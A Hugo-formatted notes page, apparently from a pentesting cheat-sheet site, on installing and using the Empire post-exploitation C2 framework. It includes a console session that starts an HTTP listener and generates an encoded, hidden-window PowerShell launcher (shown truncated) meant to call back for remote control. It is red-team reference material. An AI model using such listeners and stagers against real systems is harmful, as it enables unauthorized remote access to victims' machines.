---
### The title for the content.
title : "Empire"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "empire"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description : "Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents."
### The datetime assigned to this page.
date : 2020-03-11T10:40:17+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "empire"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
tags : ["Tools","C2","Empire"]
---

## Empire

### Install

#### System

```bash
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
sudo poetry install
```

#### Docker

```bash
# Pull the latest image
docker pull bcsecurity/empire:latest
​
# Run the server with the rest api and socket ports open
docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest
​
# Run the client
docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest client
​
# To run the client against the already running server container
docker container ls
docker exec -it {container-id} ./ps-empire client
​
# with persistent storage
docker pull bcsecurity/empire:latest
docker create -v /empire --name data bcsecurity/empire:latest
docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data bcsecurity/empire:latest
​
# if you prefer to be dropped into bash instead of directly into empire
docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data --entrypoint /bin/bash bcsecurity/empire:latest
```

### Examples

#### Start the server

```bash
./ps-empire server
```

#### Start the client

```bash
./ps-empire client
```

#### setup basic listener and gen launcher

```bash
(Empire) > listeners
[!] No listeners currently active
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://10.10.14.24:80
(Empire: listeners/http) > set BindIP 10.10.14.24
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > launcher
[!] Please enter 'launcher <language> <listenerName>'
(Empire: listeners) > launcher powershell http
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAF.....kAEsAKQApAHwASQBFAFgA
```

### Also see

* [Wiki](https://bc-security.gitbook.io/empire-wiki/)
* [Github project](https://github.com/BC-SECURITY/Empire)
* [Customizing C2 Frameworks](https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/)